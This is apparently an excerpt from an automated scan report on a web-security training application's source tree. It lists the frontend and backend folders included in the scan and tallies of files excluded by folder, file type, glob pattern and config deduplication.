- `frontend/src/app/score-board/components/challenge-card/`
- `frontend/src/app/score-board/components/challenges-unavailable-warning/`
- `frontend/src/app/score-board/components/coding-challenge-progress-score-card/`
- `frontend/src/app/score-board/components/difficulty-overview-score-card/`
- `frontend/src/app/score-board/components/difficulty-stars/`
- `frontend/src/app/score-board/components/filter-settings/`
- `frontend/src/app/score-board/components/filter-settings/components/category-filter/`
- `frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/`
- `frontend/src/app/score-board/components/filter-settings/pipes/`
- `frontend/src/app/score-board/components/hacking-challenge-progress-score-card/`
- `frontend/src/app/score-board/components/score-card/`
- `frontend/src/app/score-board/components/tutorial-mode-warning/`
- `frontend/src/app/score-board/components/warning-card/`
- `frontend/src/app/score-board/filter-settings/`
- `frontend/src/app/score-board/helpers/`
- `frontend/src/app/score-board/types/`
- `frontend/src/app/search-result/`
- `frontend/src/app/server-started-notification/`
- `frontend/src/app/sidenav/`
- `frontend/src/app/token-sale/`
- `frontend/src/app/track-result/`
- `frontend/src/app/two-factor-auth/`
- `frontend/src/app/two-factor-auth-enter/`
- `frontend/src/app/user-details/`
- `frontend/src/app/wallet/`
- `frontend/src/app/wallet-web3/`
- `frontend/src/app/web3-sandbox/`
- `frontend/src/app/welcome/`
- `frontend/src/app/welcome-banner/`
- `frontend/src/confetti/`
- `frontend/src/environments/`
- `frontend/src/hacking-instructor/`
- `frontend/src/hacking-instructor/challenges/`
- `frontend/src/hacking-instructor/helpers/`
- `ftp/`
- `lib/`
- `lib/startup/`
- `models/`
- `monitoring/`
- `routes/`
- `rsn/`
- `views/`
- `views/themes/`

### Excluded from scan (57045 files)

**Folders** (matched `exclude_dirs`):

- `node_modules/` — 54540 files
- `.git/` — 1363 files
- `build/` — 582 files
- `test/` — 139 files
- `data/static/i18n/` — 43 files
- `frontend/src/assets/i18n/` — 43 files
- `screenshots/` — 17 files
- `.junie/` — 15 files
- `.nyc_output/` — 5 files
- `vagrant/` — 3 files
- `.cursor/` — 1 files
- `.continue/` — 1 files
- `.codeium/` — 1 files
- `.zap/` — 1 files
- `i18n/` — 1 files
- `checkpoints/` — 1 files

**File types** (matched `exclude_exts`):

- `*.jpg` — 55 files
- `*.png` — 33 files
- `*.jpeg` — 4 files
- `*.url` — 4 files
- `*.bak` — 3 files
- `*.svg` — 3 files
- `*.asc` — 3 files
- `*.sha512` — 3 files
- `*.ico` — 2 files
- `*.min.js` — 2 files
- `*.stl` — 2 files
- `*.pyc` — 1 files
- `*.mp4` — 1 files

**Patterns** (matched `exclude_globs`):

- `**/*.spec.ts` — 111 files
- `frontend/src/assets/**` — 13 files
- `**/.gitignore` — 2 files
- `**/.editorconfig` — 2 files
- `**/.gitkeep` — 2 files
- `**/.mailmap` — 1 files
- `**/.dockerignore` — 1 files
- `**/LICENSE` — 1 files

**Config dedup**: 110 config files -> 2 shape-clusters; kept 2 representatives + 0 promoted (suspicious value), dropped 40 near-duplicates.

- `data/static/codefixes/localXssChallenge.info.yml` x31 (kept 1, dropped 30)
- `data/static/codefixes/resetPasswordBjoernOwaspChallenge_1.yml` x11 (kept 1, dropped 10)
